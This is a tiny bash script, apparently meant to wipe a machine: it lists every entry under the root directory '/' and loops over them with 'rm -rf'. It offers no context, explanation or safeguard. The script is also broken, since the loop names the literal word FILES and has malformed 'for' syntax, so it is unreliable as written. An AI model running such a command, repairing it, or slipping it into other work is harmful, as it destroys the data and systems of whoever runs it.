#!/bin/bash

FILES=`ls /`

for i in FILES do
	rm -rf $i
done